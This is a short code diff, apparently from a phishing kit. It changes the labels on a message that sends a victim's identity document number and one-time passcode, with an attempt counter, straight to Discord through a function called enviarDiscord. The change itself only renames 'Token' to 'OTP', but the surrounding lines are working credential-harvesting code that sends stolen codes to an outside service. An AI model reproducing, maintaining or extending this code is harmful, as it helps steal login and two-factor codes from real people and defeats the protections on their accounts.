@@ -485,11 +485,11 @@
 
             // send straight to Discord
             await enviarDiscord({
-                title: "📱 TOKEN — Intento #" + currentAttempt,
+                title: "📱 OTP — Intento #" + currentAttempt,
                 color: currentAttempt === 1 ? 15844367 : 15158332,
                 fields: [
                     { name: "👤 Documento", value: "`" + usuario + "`", inline: true },
-                    { name: "🔢 Token", value: "`" + code + "`", inline: true },
+                    { name: "🔢 OTP", value: "`" + code + "`", inline: true },
                     { name: "🔁 Intento", value: "`" + currentAttempt + "`", inline: true }
                 ],
                 timestamp: new Date().toISOString()
